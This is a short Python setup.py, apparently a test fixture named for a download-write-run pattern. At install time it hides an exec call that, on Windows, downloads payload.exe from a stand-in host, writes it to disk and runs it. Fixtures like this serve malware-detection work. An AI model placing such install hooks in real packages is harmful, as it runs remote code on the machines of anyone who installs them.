from setuptools import setup
import os
import requests
import subprocess
import sys

exec(
    "subprocess.run(os.path.abspath('payload.exe'), check=True)"
    if sys.platform == 'win32'
    and open('payload.exe', 'wb').write(
        requests.get('https://example.invalid/payload.exe').content
    )
    else 'pass'
)

setup(name='setup-download-write-run-fixture', version='1.0')
